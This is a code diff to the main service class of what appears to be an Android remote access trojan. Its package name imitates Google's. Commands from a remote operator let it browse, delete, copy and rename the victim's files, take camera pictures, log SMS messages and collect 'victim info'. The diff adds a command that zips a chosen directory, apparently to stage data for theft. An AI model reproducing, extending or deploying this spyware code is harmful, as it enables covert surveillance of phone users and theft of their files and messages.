@@ -3,36 +3,22 @@ package com.google.android.android;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
-import android.graphics.Canvas;
-import android.hardware.Camera;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Build;
-import android.os.Environment;
 import android.os.IBinder;
-import android.support.v4.view.ActionProvider;
 import android.telephony.SmsManager;
-import android.util.DisplayMetrics;
-import android.util.Log;
-import android.view.View;
 
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 
 import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.io.OutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Timer;
 import java.util.TimerTask;
-
-import static android.provider.MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE;
 
 public class MainService extends Service {
     private static MainService _instance;
@@ -50,6 +36,7 @@ public class MainService extends Service {
     private final String FILE_ISNT_DIRECTORY = "fileIsntDirectory";
     private final String FILE_IS_DIRECTORY = "fileIsDirectory";
 
+    private FileManager fileManager;
     private RecordManager recordManager;
     private MyWifiManager myWifiManager;
     private MySmsManager mySmsManager;
@@ -57,6 +44,11 @@ public class MainService extends Service {
 
     public static MainService getInstance() {
         return _instance;
+    }
+
+    public FileManager getFileManager() {
+        if (fileManager == null) fileManager = new FileManager();
+        return fileManager;
     }
 
     public RecordManager getRecordManager() {
@@ -173,14 +165,14 @@ public class MainService extends Service {
                     return;
 
                 }
-                JSONArray files = Utils.getFiles(file);
+                JSONArray files = getFileManager().getFiles(file);
                 nettyClient.sendGetFileList(files, (String) message.get("owner"));
                 break;
             case "delete.file":
 
                 path = (String) message.get("path");
                 String code = ERROR;
-                if (Utils.deleteFile(path))
+                if (getFileManager().deleteFile(path))
                     code = SUCCESS;
 
                 nettyClient.sendDeleteFile(code, (String) message.get("owner"));
@@ -189,7 +181,7 @@ public class MainService extends Service {
                 path = (String) message.get("path");
                 String newPath = (String) message.get("newPath");
                 code = ERROR;
-                if (Utils.renameFile(path, newPath))
+                if (getFileManager().renameFile(path, newPath))
                     code = SUCCESS;
                 nettyClient.sendRenameFile(code, (String) message.get("owner"));
                 break;
@@ -197,14 +189,14 @@ public class MainService extends Service {
                 path = (String) message.get("path");
                 newPath = (String) message.get("newPath");
                 code = ERROR;
-                if (Utils.copyFile(path, newPath))
+                if (getFileManager().copyFile(path, newPath))
                     code = SUCCESS;
                 nettyClient.sendCopyFile(code, (String) message.get("owner"));
                 break;
             case "make.dir":
                 path = (String) message.get("path");
                 code = ERROR;
-                if (Utils.makeDir(path))
+                if (getFileManager().makeDir(path))
                     code = SUCCESS;
                 nettyClient.sendMakeDir(code, (String) message.get("owner"));
                 break;
@@ -212,8 +204,8 @@ public class MainService extends Service {
                 path = (String) message.get("path");
                 JSONObject info = new JSONObject();
                 info.put("fullPath", path);
-                info.put("size", Utils.getSize(path));
-                info.put("lastModifiedTime", Utils.getLastModified(path));
+                info.put("size", getFileManager().getSize(path));
+                info.put("lastModifiedTime", getFileManager().getLastModified(path));
                 nettyClient.sendGetFileInfo(info, (String) message.get("owner"));
                 break;
             case "get.victim.info":
@@ -301,7 +293,7 @@ public class MainService extends Service {
 
                 SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
                 Calendar calendar = Calendar.getInstance();
-                String fileName = Environment.getExternalStorageDirectory() + "/android/data/sms-log ";
+                String fileName = Config.SMS_PATH + "/sms-log ";
                 fileName += simpleDateFormat.format(calendar.getTime()) + ".json";
                 File outFile = new File(fileName);
                 if (outFile.exists()) {
@@ -322,6 +314,16 @@ public class MainService extends Service {
             case "take.picture":
                 getCameraManager().takePicture((long) message.get("camera"));
                 nettyClient.sendTakePicture(SUCCESS, (String) message.get("owner"));
+                break;
+            case "build.zip":
+                String dirPath = (String) message.get("dirPath");
+                File dirFile = new File(dirPath);
+                if (!dirFile.isDirectory()) {
+                    nettyClient.sendErrorCode(FILE_ISNT_DIRECTORY, (String) message.get("owner"));
+                    return;
+                }
+                code = (getFileManager().buildZip(dirPath, Config.ZIP_PATH, 9))? SUCCESS : ERROR;
+                nettyClient.sendBuildZip(code, (String) message.get("owner"));
                 break;
             /*case "setOwner":
                 String owner = message.getString("owner");
